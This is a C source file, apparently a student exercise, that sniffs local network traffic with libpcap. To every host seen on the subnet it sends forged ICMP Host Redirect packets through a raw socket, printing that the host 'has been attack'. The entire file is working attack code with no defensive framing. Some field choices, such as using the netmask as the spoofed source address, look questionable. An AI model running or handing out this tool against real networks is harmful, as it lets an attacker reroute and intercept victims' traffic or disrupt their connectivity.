#include "sniffer.h"

u_int16_t checksum(u_int8_t *buf,int len)  
{  
    u_int32_t sum=0;  
    u_int16_t *cbuf;  
  
    cbuf=(u_int16_t *)buf;  
  
    while(len>1)
    {  
        sum+=*cbuf++;  
        len-=2;  
    }  
  
    if(len)  
        sum+=*(u_int8_t *)cbuf;  
  
        sum=(sum>>16)+(sum & 0xffff);  
        sum+=(sum>>16);  
  
        return ~sum;  
}  

void icmp_redirect(char * target_ip,const unsigned char * packet_data){
	printf("%s has been attack! \n",target_ip);

	struct ip_header *ip;
    struct icmp_header *icmp;
	struct packet_struct{
        struct iphdr ip;
        struct icmphdr icmp;
        char datas[28];
    }packet;
	int sockfd,res;
    int one = 1;
    int *ptr_one = &one;

	// Fill up ip header
    packet.ip.version = 4;
    packet.ip.ihl = 5;
    packet.ip.tos = 0;
    packet.ip.tot_len = htons(56);
    packet.ip.id = getpid();
    packet.ip.frag_off = 0;
    packet.ip.ttl = 255;
    packet.ip.protocol = IPPROTO_ICMP;
    packet.ip.check = 0;
    packet.ip.saddr = mask;
    packet.ip.daddr = inet_addr(target_ip);
    
    

    // Fill up icmp header
    packet.icmp.type = ICMP_REDIRECT;
    packet.icmp.code = ICMP_REDIR_HOST;
    packet.icmp.checksum = 0;
    packet.icmp.un.gateway = net;
    struct sockaddr_in dest =  {
        .sin_family = AF_INET,
        .sin_addr = {
            .s_addr = inet_addr(target_ip)
        }
    };

	memcpy(packet.datas,(packet_data + SIZE_ETHERNET),28);
    packet.ip.check = checksum(&packet.ip,sizeof(packet.ip));
    packet.icmp.checksum = checksum(&packet.icmp,sizeof(packet.icmp)+28);

	if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0)
    {
        printf("create sockfd error\n");
        exit(-1);
    }

	res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,ptr_one, sizeof(one));
    if(res < 0)
    {
        printf("error--\n");
        exit(-3);
    }

	sendto(sockfd,&packet,56,0,(struct sockaddr *)&dest,sizeof(dest));
}

void parse_packet(unsigned char * user_data, const struct pcap_pkthdr * pkthdr, const unsigned char * packet){
	const struct ether_header *ethernet;
    const struct ip *ip;
    const struct tcphdr *tcp;
    const char *payload;
	char ip_src[INET_ADDRSTRLEN];
	char ip_dst[INET_ADDRSTRLEN];
    //uint32_t usec = h->caplen;
    //uint32_t len = h->len;
    //printf("%u %u\n", usec, len);

    //printf("%lu %lu %lu\n", sizeof(struct ether_header), sizeof(struct ip), sizeof(struct tcphdr));
    ethernet = (struct ether_header *)packet;

    unsigned short ethernet_type = ntohs(ethernet->ether_type);

    /* Extract IP information. */
    ip = (struct ip*)(packet + sizeof(struct ether_header));
    inet_ntop(AF_INET, &(ip->ip_src), ip_src, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &(ip->ip_dst), ip_dst, INET_ADDRSTRLEN);

	// Check the subnet
	if ((inet_addr(ip_src) & mask) == (net & mask)) {
		icmp_redirect(ip_src,packet);
	}
}

int capture_packet(){
	char errbuf[PCAP_ERRBUF_SIZE];

	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[] = "";	/* The filter expression */



	// Accroding to WARNING: ‘pcap_lookupdev’ is deprecated: use 'pcap_findalldevs' and use the first device
	// Use 'pcap_findalldevs' instead of 'pcap_lookupdev'
	pcap_if_t *alldevs;
	if(pcap_findalldevs(&alldevs,errbuf) == -1){
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
	}
	// The first(default) device is 'alldevs->name'

	if (pcap_lookupnet(alldevs->name, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", alldevs->name, errbuf);
	}

	// Open the default device
	pcap_t* handle = pcap_open_live(alldevs->name,SNAP_LEN,PORMISC,TO_MS,errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s\n", errbuf);
		return(1);
	}

	// Compile the expression
	if (pcap_compile(handle,&fp,filter_exp,COMPILE_OPTIMIZE,net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(1);
	}

	// Set filter
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(1);
	}
	
	// Start capture packet
	pcap_loop(handle,LOOP_TO_FAULT,parse_packet,NULL);	
	return(0);
}